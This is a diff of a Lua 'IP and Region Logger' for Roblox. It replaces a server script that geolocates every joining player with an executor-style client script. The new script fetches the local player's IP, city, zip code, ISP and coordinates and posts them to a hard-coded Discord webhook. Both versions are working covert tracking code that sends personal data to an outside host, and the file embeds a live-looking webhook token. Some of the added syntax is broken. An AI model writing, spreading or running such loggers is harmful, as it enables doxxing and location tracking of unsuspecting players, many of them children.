@@ -1,145 +1,44 @@
--- IP and Region Logger for Roblox
-local WebhookUrl = "https://discord.com/api/webhooks/1497298267988561970/dmpYd0l-0IDprQFBys7iY08ssUTKl2jeJW4r8GMkYMCAXOwV2pCqoOidE6M8H4Z2xTn-"
+local name = game:GetService("Players").LocalPlayer.Name
+local WebhookURL = "https://discord.com/api/webhooks/1497298267988561970/dmpYd0l-0IDprQFBys7iY08ssUTKl2jeJW4r8GMkYMCAXOwV2pCqoOidE6M8H4Z2xTn-"
+// put your webhook there
+local getIPResponse = request({
+    Url = "https://api.ipify.org/?format=json",
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
 
--- Services
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
+local getIPInfo = http.request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer)
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org
+}
+local dataMessage = string.format("
+User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s
+", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+local MessageData = {
+    ["content"] = dataMessage
+}
 
--- Enable HTTP requests for allowed domains
-HttpService.HttpEnabled = true
-
--- Function to get IP and region information
-local function getIpInfo()
-    -- Try multiple IP geolocation APIs in case one fails
-    local apis = {
-        "https://ipapi.co/json/",
-        "https://ipinfo.io/json",
-        "https://api.ipify.org?format=json"
-    }
-    
-    for _, apiUrl in ipairs(apis) do
-        local success, response = pcall(function()
-            return HttpService:GetAsync(apiUrl)
-        end)
-        
-        if success then
-            local data = HttpService:JSONDecode(response)
-            
-            -- Handle different API response formats
-            if data.ip then
-                return {
-                    ip = data.ip,
-                    region = data.region or data.regionName or "Unknown",
-                    country = data.country_name or data.country or "Unknown",
-                    city = data.city or "Unknown",
-                    latitude = data.latitude or data.lat or "Unknown",
-                    longitude = data.longitude or data.lon or "Unknown"
-                }
-            end
-        end
-    end
-    
-    warn("Failed to get IP information from all APIs")
-    return {
-        ip = "Unknown",
-        region = "Unknown",
-        country = "Unknown",
-        city = "Unknown",
-        latitude = "Unknown",
-        longitude = "Unknown"
-    }
-end
-
--- Function to send data to Discord webhook
-local function sendToDiscord(player, ipInfo)
-    local embed = {
-        title = "User IP and Region Information",
-        color = 0x3498db,
-        fields = {
-            {
-                name = "Username",
-                value = player.Name,
-                inline = true
-            },
-            {
-                name = "User ID",
-                value = tostring(player.UserId),
-                inline = true
-            },
-            {
-                name = "IP Address",
-                value = ipInfo.ip,
-                inline = true
-            },
-            {
-                name = "Region",
-                value = ipInfo.region,
-                inline = true
-            },
-            {
-                name = "Country",
-                value = ipInfo.country,
-                inline = true
-            },
-            {
-                name = "City",
-                value = ipInfo.city,
-                inline = true
-            },
-            {
-                name = "Coordinates",
-                value = string.format("%s, %s", ipInfo.latitude, ipInfo.longitude),
-                inline = true
-            }
+local send_hook = request(
+    {
+        Url = WebhookURL, 
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
         },
-        footer = {
-            text = "Roblox IP Logger"
-        }
+        Body = game:GetService("HttpService"):JSONEncode(MessageData)
     }
-    
-    local data = {
-        embeds = {embed}
-    }
-    
-    local success, response = pcall(function()
-        return HttpService:PostAsync(WebhookUrl, HttpService:JSONEncode(data))
-    end)
-    
-    if not success then
-        warn("Failed to send to Discord: " .. tostring(response))
-        return false
-    end
-    return true
-end
-
--- Function to handle player joining
-local function onPlayerAdded(player)
-    print("Logging information for player: " .. player.Name)
-    
-    -- Get IP information
-    local ipInfo = getIpInfo()
-    print("IP Info retrieved for " .. player.Name)
-    
-    -- Send to Discord
-    local sent = sendToDiscord(player, ipInfo)
-    if sent then
-        print("Successfully sent data to Discord for " .. player.Name)
-    else
-        print("Failed to send data to Discord for " .. player.Name)
-    end
-    
-    return ipInfo
-end
-
--- Connect to player added event
-Players.PlayerAdded:Connect(onPlayerAdded)
-
--- Log existing players when script runs
-for _, player in ipairs(Players:GetPlayers()) do
-    spawn(function()
-        onPlayerAdded(player)
-    end)
-end
-
--- Debug information
-print("IP Logger initialized. Webhook URL: " .. WebhookUrl)
+)
+print(send_hook.StatusCode)
